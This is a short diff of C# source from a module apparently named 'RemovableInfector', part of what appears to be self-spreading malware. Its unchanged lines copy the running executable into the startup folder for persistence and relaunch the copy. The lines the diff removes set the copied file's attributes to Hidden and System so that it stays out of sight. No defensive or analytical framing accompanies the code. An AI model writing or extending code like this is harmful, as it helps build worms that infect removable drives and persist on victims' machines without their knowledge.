@@ -53,10 +53,6 @@ namespace zort
                 File.Copy(currentPath, startupPath, true);
                 ModuleLogger.Log(typeof(RemovableInfector), $"Moved self to startup folder: {startupPath}");
 
-                // Give hidden and system attributes to the file
-                File.SetAttributes(startupPath, FileAttributes.Hidden | FileAttributes.System);
-                ModuleLogger.Log(typeof(RemovableInfector), $"Set hidden and system attributes to: {startupPath}");
-
                 // Start the cloned executable and exit
                 System.Diagnostics.Process.Start(startupPath);
                 ModuleLogger.Log(typeof(RemovableInfector), $"Started cloned executable: {startupPath}");
